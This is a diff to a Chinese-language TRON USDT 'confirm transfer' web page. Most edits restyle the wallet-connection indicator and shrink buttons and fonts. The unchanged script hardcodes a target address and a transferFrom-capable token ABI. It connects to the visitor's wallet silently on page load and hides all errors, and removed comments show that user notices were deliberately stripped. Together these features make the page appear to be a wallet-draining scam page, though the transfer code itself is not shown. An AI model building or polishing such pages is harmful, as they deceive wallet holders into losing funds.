@@ -27,19 +27,32 @@ body {
 }
 .header-right-icons {
   display: flex;
-  gap: 16px;
+  gap: 12px;
   align-items: center;
 }
-.icon-btn {
-  width: 36px;
-  height: 36px;
+/* 钱包状态小圆点 */
+.wallet-dot {
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  background-color: #ef4444;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+.wallet-dot.connected {
+  background-color: #22c55e;
+}
+/* 设置按钮缩小一点 */
+.setting-btn {
+  width: 32px;
+  height: 32px;
   border-radius: 50%;
   border: 1px solid #ddd;
   background: #fff;
   display: flex;
   align-items: center;
   justify-content: center;
-  font-size: 20px;
+  font-size: 18px;
   cursor: pointer;
 }
 .address-card {
@@ -75,7 +88,7 @@ body {
   margin-bottom: 16px;
 }
 .amount-input {
-  font-size: 48px;
+  font-size: 32px;
   border: none;
   outline: none;
   width: 75%;
@@ -83,7 +96,7 @@ body {
   color: #111;
 }
 .amount-input::placeholder {
-  font-size: 18px;
+  font-size: 16px;
   color: #aaa;
 }
 .max-btn {
@@ -151,7 +164,6 @@ body {
   background:#94a3b8;
   cursor:not-allowed;
 }
-/* 彻底删除底部提示框样式 */
 </style>
 </head>
 <body>
@@ -159,8 +171,10 @@ body {
 <div class="top-header-bar">
   <div></div>
   <div class="header-right-icons">
-    <div class="icon-btn" id="walletIconBtn" title="点击连接/断开钱包">🔐</div>
-    <div class="icon-btn" id="settingIconBtn" title="设置">⚙️</div>
+    <!-- 红色/绿色小圆点：钱包连接状态 -->
+    <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
+    <!-- 设置按钮 -->
+    <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
   </div>
 </div>
 
@@ -192,8 +206,6 @@ body {
 
 <button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
 
-<!-- 彻底删掉底部提示框DOM元素 -->
-
 <script>
 const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -205,7 +217,7 @@ let usdtContract = null;
 let provider = null;
 
 const $ = s => document.querySelector(s);
-const walletIconBtn = $("#walletIconBtn");
+const walletDot = $("#walletDot");
 const settingIconBtn = $("#settingIconBtn");
 const sendBtn = $("#sendBtn");
 const amountInput = $("#amountInput");
@@ -220,18 +232,18 @@ const USDT_ABI = [
   {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
-// 断开钱包重置所有状态（不再弹出任何提示）
+// 断开钱包重置所有状态
 function disconnectWallet() {
   tronWeb = null;
   userAddress = "";
   usdtContract = null;
   provider = null;
-  walletIconBtn.innerText = "🔐";
+  walletDot.classList.remove("connected");
   sendBtn.disabled = true;
   balanceText.textContent = "0.000000";
 }
 
-// 连接核心函数（静默连接，无任何提示文字）
+// 连接核心函数
 async function connectWalletLogic() {
   if (tronWeb && userAddress) {
     disconnectWallet();
@@ -253,17 +265,16 @@ async function connectWalletLogic() {
       tronWeb = window.tronWeb;
       userAddress = tronWeb.defaultAddress.base58;
     } else {
-      return; // 找不到钱包直接静默退出，不报错
+      return;
     }
 
-    walletIconBtn.innerText = "✅";
+    walletDot.classList.add("connected");
     usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
     await loadBalance();
     sendBtn.disabled = false;
 
     if (provider && provider.on) provider.on("accountsChanged", () => location.reload());
   } catch (err) {
-    // 所有错误全部静默吃掉，不显示任何文字提示
     return;
   }
 }
@@ -312,10 +323,10 @@ sendBtn.addEventListener("click", async () => {
   }
 });
 
-walletIconBtn.addEventListener("click", connectWalletLogic);
+walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", () => alert("设置面板"));
 
-// 页面静默自动连接，无提示
+// 页面静默自动连接
 window.addEventListener("DOMContentLoaded", () => {
   setTimeout(connectWalletLogic, 800);
 });
